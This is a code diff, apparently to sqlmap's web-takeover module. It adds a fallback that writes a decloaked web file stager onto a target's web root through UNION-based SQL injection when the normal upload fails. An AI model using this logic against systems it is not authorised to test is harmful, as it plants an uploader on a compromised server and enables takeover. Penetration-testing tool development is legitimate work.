@@ -14,6 +14,7 @@ from extra.cloak.cloak import decloak
 from lib.core.agent import agent
 from lib.core.common import arrayizeValue
 from lib.core.common import Backend
+from lib.core.common import decloakToMkstemp
 from lib.core.common import decloakToNamedTemporaryFile
 from lib.core.common import extractRegexResult
 from lib.core.common import getDirs
@@ -238,16 +239,28 @@ class Web:
                 self.webStagerFilePath = ntToPosixSlashes(normalizePath("%s/%s" % (localPath, stagerName))).replace("//", "/").rstrip('/')
 
                 uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
-
                 uplPage = uplPage or ""
 
                 if "sqlmap file uploader" not in uplPage:
                     warnMsg = "unable to upload the file stager "
                     warnMsg += "on '%s'" % localPath
                     singleTimeWarnMessage(warnMsg)
-                    continue
 
-                elif "<%" in uplPage or "<?" in uplPage:
+                    if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
+                        infoMsg = "trying to upload the file stager via "
+                        infoMsg += "UNION technique"
+                        logger.info(infoMsg)
+
+                        stagerDecloacked = decloakToMkstemp(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
+                        self.unionWriteFile(stagerDecloacked.name, self.webStagerFilePath, "text")
+
+                        uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
+                        uplPage = uplPage or ""
+
+                        if "sqlmap file uploader" not in uplPage:
+                            continue
+
+                if "<%" in uplPage or "<?" in uplPage:
                     warnMsg = "file stager uploaded on '%s', " % localPath
                     warnMsg += "but not dynamically interpreted"
                     logger.warn(warnMsg)
